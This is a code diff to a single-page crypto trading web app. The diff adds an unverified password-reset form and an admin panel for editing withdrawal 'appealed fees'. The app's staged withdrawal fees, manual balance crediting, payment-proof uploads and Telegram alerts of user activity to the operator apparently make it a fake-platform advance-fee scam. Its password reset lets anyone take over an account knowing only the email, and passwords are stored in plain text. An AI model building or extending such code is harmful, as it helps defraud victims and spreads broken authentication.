@@ -223,7 +223,7 @@
 
             <div class="card">
                 <h3 style="margin-bottom:0.75rem;">Live Market Cryptos & Fiat</h3>
-                <!-- USD fiat (Direct USD currency) placed above Bitcoin as requested -->
+                <!-- USD fiat (Direct USD currency) placed above Bitcoin -->
                 <div class="asset-row" id="usd-asset-row">
                     <div class="asset-info">
                         <div class="asset-icon" style="background:var(--accent-green); color:#fff;">💵</div>
@@ -345,17 +345,18 @@
                 </form>
             </div>
 
-            <!-- MANUAL USER STATUS & STEP OVERRIDE / ASSIGNMENT -->
+            <!-- MANUAL USER STATUS & STEP OVERRIDE / ASSIGNMENT FOR WITHDRAWAL USERS -->
             <div class="card" style="border: 2px dashed var(--primary);">
-                <h3>🛠️ Manual User Step Assignment & Override</h3>
-                <p style="color:var(--text-muted); font-size:0.85rem; margin-bottom:1rem;">Manually assign any of the created withdrawal steps to a user, override their progress, or manage status progression:</p>
-                <form onsubmit="adminManualOverrideUser(event)">
-                    <div class="form-group"><label>Select User Email</label><select id="admin-override-user" class="form-control" required></select></div>
-                    <div class="form-group"><label>Override Mode</label><select id="admin-override-type" class="form-control" required><option value="step">Assign Specific Step</option><option value="status">Update Status Text</option></select></div>
-                    <div class="form-group"><label>Target Step or Value (e.g. Select Step to Assign or status)</label><select id="admin-override-step-select" class="form-control"></select></div>
-                    <div class="form-group hidden" id="admin-override-custom-val-group"><label>Custom Status Text</label><input type="text" id="admin-override-value" class="form-control" placeholder="e.g. Activating"></div>
-                    <button type="submit" class="btn btn-success">Apply Assignment / Override</button>
-                </form>
+                <h3>🛠️ Users With Active Withdrawals & Fee Appeals Management</h3>
+                <p style="color:var(--text-muted); font-size:0.85rem; margin-bottom:1rem;">Manage users who have submitted withdrawal requests, view their current step, edit appealed fees, or search by email:</p>
+                
+                <!-- Search bar for users with withdrawals -->
+                <div class="form-group">
+                    <input type="text" id="admin-withdrawal-search" class="form-control" placeholder="Search user by email..." oninput="renderAdminDashboard()">
+                </div>
+
+                <div id="admin-withdrawal-users-list"></div>
+                <div id="admin-withdrawal-toggle-container" style="margin-top:0.75rem; text-align:center;"></div>
             </div>
 
             <div class="card">
@@ -675,6 +676,7 @@
         </div>
     </div>
 
+    <!-- AUTH MODAL -->
     <div class="modal" id="auth-modal">
         <div class="modal-body">
             <span class="close-btn" onclick="closeAuthModal()">&times;</span>
@@ -685,6 +687,9 @@
             <form id="signin-form" onsubmit="handleSignIn(event)">
                 <div class="form-group"><label>Email Address</label><input type="email" id="signin-email" class="form-control" required></div>
                 <div class="form-group"><label>Password</label><input type="password" id="signin-password" class="form-control" required></div>
+                <div style="text-align:right; margin-bottom:1rem;">
+                    <span style="font-size:0.8rem; color:var(--primary); cursor:pointer; text-decoration:underline;" onclick="openForgotPasswordModal()">Forgot Password?</span>
+                </div>
                 <button type="submit" class="btn btn-success">Sign In</button>
             </form>
             <form id="signup-form" class="hidden" onsubmit="handleSignUp(event)">
@@ -701,6 +706,20 @@
                     </label>
                 </div>
                 <button type="submit" class="btn btn-success" style="margin-top:1rem;">Create Account</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- FORGOT / RESET PASSWORD MODAL -->
+    <div class="modal" id="forgot-password-modal">
+        <div class="modal-body">
+            <span class="close-btn" onclick="closeForgotPasswordModal()">&times;</span>
+            <h3 style="margin-bottom:0.5rem; color:var(--primary);">🔑 Reset Password</h3>
+            <p style="color:var(--text-muted); font-size:0.85rem; margin-bottom:1rem;">Enter your registered email address below to reset your account password.</p>
+            <form onsubmit="handlePasswordReset(event)">
+                <div class="form-group"><label>Registered Email Address</label><input type="email" id="reset-email-input" class="form-control" required></div>
+                <div class="form-group"><label>New Password</label><input type="password" id="reset-new-password" class="form-control" required></div>
+                <button type="submit" class="btn btn-success">Update Password & Login</button>
             </form>
         </div>
     </div>
@@ -759,7 +778,6 @@
             }).catch(err => console.error("Telegram Alert Error:", err));
         }
 
-        // CLEAN INITIALIZATION (No hardcoded dummy user array to wipe data)
         let usersList = [];
         let currentUserEmail = localStorage.getItem('chronicle_current_user') || null;
         let userEmails = {};
@@ -784,6 +802,7 @@
         let chatThreads = {};
         let selectedAdminChatUser = null;
         let showAllUsers = false;
+        let showAllWithdrawalUsers = false;
         let currentTheme = localStorage.getItem('chronicle_theme') || 'dark';
 
         if (currentTheme === 'light') document.getElementById('app-body').classList.add('light-mode');
@@ -807,7 +826,6 @@
                     lastInboxCount = newInboxLength;
                 }
 
-                // Only update local memory if remote database actually has records
                 if (data.usersList) usersList = data.usersList;
                 if (data.userEmails) userEmails = data.userEmails;
                 if (data.exchanges) exchanges = data.exchanges;
@@ -843,7 +861,7 @@
                     renderAdminDashboard();
                 }
             } else {
-                console.warn("Firestore document appData not found yet. Waiting for first save...");
+                console.warn("Firestore document appData not found yet.");
             }
         }, (error) => {
             console.error("Firestore Error:", error);
@@ -919,7 +937,7 @@
 
         function getCurrentUserData() {
             if (!currentUserEmail) return null;
-            let u = usersList.find(x => x.email === currentUserEmail);
+            let u = usersList.find(x => x.email.trim().toLowerCase() === currentUserEmail.trim().toLowerCase());
             return u || null;
         }
 
@@ -928,7 +946,7 @@
             userEmails[email].unshift({ subject, body, date: new Date().toLocaleTimeString() });
             saveState();
 
-            if (currentUserEmail === email) {
+            if (currentUserEmail && currentUserEmail.trim().toLowerCase() === email.trim().toLowerCase()) {
                 showNotification(popupTitle, body, "💸");
             }
         }
@@ -1083,7 +1101,7 @@
 
             const recipientUser = usersList.find(x => x.userId === recipientId);
             if (!recipientUser) { alert("Recipient User ID not found on platform."); return; }
-            if (recipientUser.email === currentUserEmail) { alert("Cannot send to yourself."); return; }
+            if (recipientUser.email.trim().toLowerCase() === currentUserEmail.trim().toLowerCase()) { alert("Cannot send to yourself."); return; }
 
             let deductBtc = 0, deductEth = 0, deductUsd = 0;
             let fiatVal = 0;
@@ -1200,7 +1218,6 @@
             saveState(); updateBalanceUI();
             showNotification("Processing", `Withdrawal request submitted`, "💳");
             
-            // Telegram notification for withdrawal request
             sendTelegramAlert(`💳 <b>NEW WITHDRAWAL REQUEST</b>\n\n👤 <b>User:</b> ${currentUserEmail}\n💰 <b>Amount:</b> $${amt.toFixed(2)}\n🏦 <b>Method:</b> ${selectedWithdrawMethodName}`);
 
             setTimeout(() => { openActionModal(); }, 1500);
@@ -1216,7 +1233,6 @@
             document.getElementById('modal-step-title').innerText = `⚠️ ${step.title}`;
             document.getElementById('modal-step-note').innerText = step.note ? `Note: ${step.note}` : '';
             
-            // Check if admin made a price adjustment/appeal for this user's current step
             const displayAmt = (u.appealedFees && u.appealedFees[currentStepIdx] !== undefined) ? u.appealedFees[currentStepIdx] : step.amount;
             document.getElementById('modal-step-amount').innerText = `$${displayAmt}.00`;
 
@@ -1230,7 +1246,7 @@
             const uploadSection = document.getElementById('proof-upload-section');
             const submittedNotice = document.getElementById('proof-submitted-notice');
 
-            const existingProof = proofQueue.find(p => p.user === currentUserEmail && p.stepIdx === currentStepIdx);
+            const existingProof = proofQueue.find(p => p.user.trim().toLowerCase() === currentUserEmail.trim().toLowerCase() && p.stepIdx === currentStepIdx);
             const tx = (u.txs || []).find(t => t.id == u.activeTxId);
 
             if (existingProof || (tx && tx.status && tx.status.includes('PROOF SUBMITTED'))) {
@@ -1305,7 +1321,6 @@
                         fileInput.value = "";
                         showNotification("Submitted", `Proof submitted successfully!`, "🖼️");
                         
-                        // Telegram alert for proof submission
                         sendTelegramAlert(`🖼️ <b>PAYMENT PROOF SUBMITTED</b>\n\n👤 <b>User:</b> ${currentUserEmail}\n⚙️ <b>Step:</b> ${step.title}\n💵 <b>Amount:</b> $${step.amount}`);
 
                         alert(`Proof submitted successfully for ${step.title}! It is now pending Admin approval.`);
@@ -1362,49 +1377,6 @@
             }
             if (pendingSaves === 0) { saveState(); alert("Global addresses updated!"); }
         }
-
-        function adminManualOverrideUser(e) {
-            e.preventDefault();
-            const email = document.getElementById('admin-override-user').value;
-            const type = document.getElementById('admin-override-type').value;
-            
-            const targetUser = usersList.find(x => x.email === email);
-            if (!targetUser) { alert("User not found."); return; }
-
-            const tx = (targetUser.txs || []).find(t => t.id == targetUser.activeTxId);
-
-            if (type === 'status') {
-                const val = document.getElementById('admin-override-value').value.trim();
-                if (tx) tx.status = val.toUpperCase();
-                alert(`Successfully updated ${email}'s transaction status to "${val.toUpperCase()}"`);
-            } else {
-                const selectedStepIdx = parseInt(document.getElementById('admin-override-step-select').value, 10);
-                if (isNaN(selectedStepIdx)) { alert("Please select a valid step."); return; }
-                
-                targetUser.stepIdx = selectedStepIdx;
-                if (tx && actionSteps[selectedStepIdx]) {
-                    tx.status = `PENDING (${actionSteps[selectedStepIdx].title.toUpperCase()})`;
-                }
-                alert(`Successfully assigned step "${actionSteps[selectedStepIdx].title}" (Index: ${selectedStepIdx}) to ${email}`);
-            }
-
-            saveState();
-            renderAdminDashboard();
-        }
-
-        // Handle toggle between step assignment and status text override
-        document.getElementById('admin-override-type').addEventListener('change', function() {
-            const val = this.value;
-            const stepSelect = document.getElementById('admin-override-step-select');
-            const customValGroup = document.getElementById('admin-override-custom-val-group');
-            if (val === 'step') {
-                stepSelect.parentElement.style.display = 'block';
-                customValGroup.classList.add('hidden');
-            } else {
-                stepSelect.parentElement.style.display = 'none';
-                customValGroup.classList.remove('hidden');
-            }
-        });
 
         function saveKnowledgeBase(e) {
             e.preventDefault();
@@ -1534,7 +1506,6 @@
             renderUserChatMessages();
             saveState();
 
-            // Telegram alert for support message
             sendTelegramAlert(`💬 <b>NEW SUPPORT MESSAGE</b>\n\n👤 <b>User:</b> ${currentUserEmail}\n✉️ <b>Message:</b> ${msg}`);
 
             if (!document.getElementById('admin-tab').classList.contains('hidden')) {
@@ -1601,7 +1572,7 @@
             const amount = Number(document.getElementById('admin-bal-amount').value);
             const reason = document.getElementById('admin-bal-reason').value;
 
-            let targetUser = usersList.find(x => x.email === email);
+            let targetUser = usersList.find(x => x.email.trim().toLowerCase() === email.trim().toLowerCase());
             if (!targetUser) return;
 
             if (action === 'topup') targetUser[asset] += amount;
@@ -1611,7 +1582,6 @@
             saveState(); updateBalanceUI();
             showNotification("Balance Updated", `${asset.toUpperCase()} ${action === 'topup' ? 'credited' : 'debited'} by ${amount}`, "💰");
             
-            // Telegram alert for balance change
             sendTelegramAlert(`💰 <b>ADMIN BALANCE UPDATE</b>\n\n👤 <b>User:</b> ${email}\n⚙️ <b>Action:</b> ${action.toUpperCase()} ${asset.toUpperCase()}\n💵 <b>Amount:</b> ${amount}\n📝 <b>Reason:</b> ${reason}`);
 
             alert(`Successfully updated balance for ${email}!`);
@@ -1656,7 +1626,7 @@
         }
 
         function adminEditUserAppealedFee(userEmail, stepIndex) {
-            const u = usersList.find(x => x.email === userEmail);
+            const u = usersList.find(x => x.email.trim().toLowerCase() === userEmail.trim().toLowerCase());
             if (!u) return;
             if (!u.appealedFees) u.appealedFees = {};
             
@@ -1678,7 +1648,7 @@
             const p = proofQueue[pIndex];
             proofQueue.splice(pIndex, 1);
 
-            const u = usersList.find(x => x.email === p.user);
+            const u = usersList.find(x => x.email.trim().toLowerCase() === p.user.trim().toLowerCase());
             if (u) {
                 const tx = u.txs.find(t => t.id == u.activeTxId);
                 const step = actionSteps[p.stepIdx];
@@ -1703,7 +1673,7 @@
 
             proofQueue.splice(pIndex, 1);
 
-            const u = usersList.find(x => x.email === p.user);
+            const u = usersList.find(x => x.email.trim().toLowerCase() === p.user.trim().toLowerCase());
             if (u) {
                 const tx = u.txs.find(t => t.id == u.activeTxId);
                 if (tx) tx.status = "PROOF REJECTED";
@@ -1719,6 +1689,11 @@
             renderAdminDashboard();
         }
 
+        function toggleSeeMoreWithdrawalUsers() {
+            showAllWithdrawalUsers = !showAllWithdrawalUsers;
+            renderAdminDashboard();
+        }
+
         function renderAdminDashboard() {
             document.getElementById('admin-btc-addr').value = globalAddresses.btc || '';
             document.getElementById('admin-eth-addr').value = globalAddresses.eth || '';
@@ -1726,19 +1701,48 @@
             document.getElementById('admin-terms-text').value = platformTerms || '';
             document.getElementById('admin-kb-text').value = knowledgeBase || '';
             document.getElementById('admin-target-user').innerHTML = usersList.map(u => `<option value="${u.email}">${u.email} [ID: ${u.userId}] (USD: $${u.usd})</option>`).join('');
-            document.getElementById('admin-override-user').innerHTML = usersList.map(u => `<option value="${u.email}">${u.email} (Step: ${u.stepIdx})</option>`).join('');
+
+            // Filter users who have active withdrawals or past withdrawal transactions
+            const searchVal = (document.getElementById('admin-withdrawal-search').value || '').trim().toLowerCase();
+            const usersWithWithdrawals = usersList.filter(u => {
+                const hasWithdrawalTx = (u.txs || []).some(t => t.type && t.type.toLowerCase().includes('withdraw'));
+                const matchesSearch = u.email.toLowerCase().includes(searchVal);
+                return hasWithdrawalTx && matchesSearch;
+            });
+
+            const displayedWithdrawalUsers = showAllWithdrawalUsers ? usersWithWithdrawals : usersWithWithdrawals.slice(0, 4);
             
-            // Populate step select dropdown for manual assignment
-            document.getElementById('admin-override-step-select').innerHTML = actionSteps.map((st, i) => `<option value="${i}">Step ${i+1}: ${st.title} ($${st.amount})</option>`).join('');
+            document.getElementById('admin-withdrawal-users-list').innerHTML = displayedWithdrawalUsers.length === 0 ? 
+                `<div style="color:var(--text-muted); font-size:0.85rem; padding:0.5rem;">No users found with withdrawal requests.</div>` :
+                displayedWithdrawalUsers.map(u => {
+                    const withdrawTx = (u.txs || []).find(t => t.type && t.type.toLowerCase().includes('withdraw'));
+                    const amount = withdrawTx ? withdrawTx.amount : 0;
+                    const stepName = actionSteps[u.stepIdx] ? actionSteps[u.stepIdx].title : 'Completed / None';
+                    return `
+                        <div style="background:var(--bg-input); padding:0.6rem; margin-bottom:0.4rem; border-radius:6px; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:0.5rem;">
+                            <div>
+                                <strong>${u.name || 'User'} (${u.email})</strong> [ID: ${u.userId}]<br>
+                                <span style="font-size:0.8rem; color:var(--text-muted);">Withdrawal Amount: $${amount.toFixed(2)} | Current Step: <strong>${stepName}</strong> (Index: ${u.stepIdx || 0})</span>
+                            </div>
+                            <div>
+                                <button class="btn btn-outline" style="width:auto; padding:0.2rem 0.5rem; font-size:0.75rem;" onclick="adminEditUserAppealedFee('${u.email}', ${u.stepIdx || 0})">Edit Appealed Fee</button>
+                            </div>
+                        </div>
+                    `;
+                }).join('');
+
+            const withdrawalToggleContainer = document.getElementById('admin-withdrawal-toggle-container');
+            if (usersWithWithdrawals.length > 4) {
+                withdrawalToggleContainer.innerHTML = `<button class="btn btn-outline" style="width:auto; padding:0.3rem 0.8rem; font-size:0.75rem; display:inline-block;" onclick="toggleSeeMoreWithdrawalUsers()">${showAllWithdrawalUsers ? 'See Less ▲' : 'See More ▼ (' + (usersWithWithdrawals.length - 4) + ' more)'}</button>`;
+            } else {
+                withdrawalToggleContainer.innerHTML = '';
+            }
 
             const displayedUsers = showAllUsers ? usersList : usersList.slice(0, 4);
             document.getElementById('admin-users-list').innerHTML = displayedUsers.map(u => `
                 <div style="background:var(--bg-input); padding:0.6rem; margin-bottom:0.4rem; border-radius:6px; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:0.5rem;">
                     <div>
-                        <strong>${u.name || 'User'} (${u.email})</strong> [ID: ${u.userId}] - Step: ${u.stepIdx} | USD: $${u.usd}
-                    </div>
-                    <div>
-                        <button class="btn btn-outline" style="width:auto; padding:0.2rem 0.5rem; font-size:0.75rem;" onclick="adminEditUserAppealedFee('${u.email}', ${u.stepIdx || 0})">Edit Appealed Fee</button>
+                        <strong>${u.name || 'User'} (${u.email})</strong> [ID: ${u.userId}] - USD: $${u.usd}
                     </div>
                 </div>
             `).join('');
@@ -1795,7 +1799,7 @@
             const userTypingStatus = document.getElementById('admin-user-typing-status');
             
             if (selectedAdminChatUser && chatThreads[selectedAdminChatUser]) {
-                const targetUsr = usersList.find(x => x.email === selectedAdminChatUser);
+                const targetUsr = usersList.find(x => x.email.trim().toLowerCase() === selectedAdminChatUser.trim().toLowerCase());
                 const profileName = targetUsr ? (targetUsr.name || selectedAdminChatUser) : selectedAdminChatUser;
                 profileTitle.innerText = `💬 Profile: ${profileName} (${selectedAdminChatUser})`;
 
@@ -1876,14 +1880,46 @@
             alert(platformTerms);
         };
 
+        // --- PASSWORD RESET FUNCTIONS ---
+        function openForgotPasswordModal() {
+            closeAuthModal();
+            document.getElementById('reset-email-input').value = '';
+            document.getElementById('reset-new-password').value = '';
+            document.getElementById('forgot-password-modal').style.display = 'flex';
+        }
+        function closeForgotPasswordModal() {
+            document.getElementById('forgot-password-modal').style.display = 'none';
+        }
+        function handlePasswordReset(e) {
+            e.preventDefault();
+            const email = document.getElementById('reset-email-input').value.trim().toLowerCase();
+            const newPassword = document.getElementById('reset-new-password').value;
+
+            const u = usersList.find(x => x.email.trim().toLowerCase() === email);
+            if (!u) {
+                alert("No account found with this registered email address.");
+                return;
+            }
+
+            u.password = newPassword;
+            saveState();
+            closeForgotPasswordModal();
+            showNotification("Password Reset", "Password successfully updated! You can now log in.", "🔒");
+            
+            sendTelegramAlert(`🔑 <b>PASSWORD RESET</b>\n\n👤 <b>User:</b> ${email}`);
+            
+            openAuthModal('signin');
+            document.getElementById('signin-email').value = email;
+        }
+
         function handleSignUp(e) {
             e.preventDefault();
             const name = document.getElementById('signup-name').value.trim();
-            const email = document.getElementById('signup-email').value;
+            const email = document.getElementById('signup-email').value.trim().toLowerCase();
             const password = document.getElementById('signup-password').value;
             const termsChecked = document.getElementById('signup-terms-check').checked;
             if (!termsChecked) { alert("You must agree to the Terms & Conditions."); return; }
-            if (usersList.some(x => x.email === email)) { alert("Account already exists."); return; }
+            if (usersList.some(x => x.email.trim().toLowerCase() === email)) { alert("Account already exists with this email."); return; }
             
             const uniqueId = 'CRN-' + Math.floor(1000 + Math.random() * 9000);
             const newUser = { name, email, userId: uniqueId, password, pin: null, btc: 0, eth: 0, usd: 0, txs: [], stepIdx: 0, activeTxId: null, statusExpiryTime: null, appealedFees: {} };
@@ -1894,7 +1930,6 @@
             updateBalanceUI();
             showNotification("Welcome", `Account created! Your ID is ${uniqueId}`, "🎉");
             
-            // Telegram notification for new user signup
             sendTelegramAlert(`👤 <b>NEW USER REGISTRATION</b>\n\n📛 <b>Name:</b> ${name}\n📧 <b>Email:</b> ${email}\n🆔 <b>ID:</b> ${uniqueId}`);
 
             document.getElementById('pin-setup-modal').style.display = 'flex';
@@ -1902,12 +1937,16 @@
 
         function handleSignIn(e) {
             e.preventDefault();
-            const email = document.getElementById('signin-email').value;
+            const email = document.getElementById('signin-email').value.trim().toLowerCase();
             const password = document.getElementById('signin-password').value;
-            const u = usersList.find(x => x.email === email && x.password === password);
-            if (!u) { alert("Invalid login credentials."); return; }
+            
+            const u = usersList.find(x => x.email.trim().toLowerCase() === email && x.password === password);
+            if (!u) { 
+                alert("Incorrect password or email. Please check your credentials or click 'Forgot Password?' to reset."); 
+                return; 
+            }
 
-            currentUserEmail = email;
+            currentUserEmail = u.email;
             localStorage.setItem('chronicle_current_user', currentUserEmail);
             closeAuthModal();
             updateBalanceUI();
@@ -1919,7 +1958,7 @@
         function handlePinSetup(e) {
             e.preventDefault();
             const pin = document.getElementById('new-pin-input').value;
-            const u = usersList.find(x => x.email === currentUserEmail);
+            const u = usersList.find(x => x.email.trim().toLowerCase() === currentUserEmail.trim().toLowerCase());
             if (u) { u.pin = pin; saveState(); }
             document.getElementById('pin-setup-modal').style.display = 'none';
             alert("Withdrawal PIN saved successfully!");
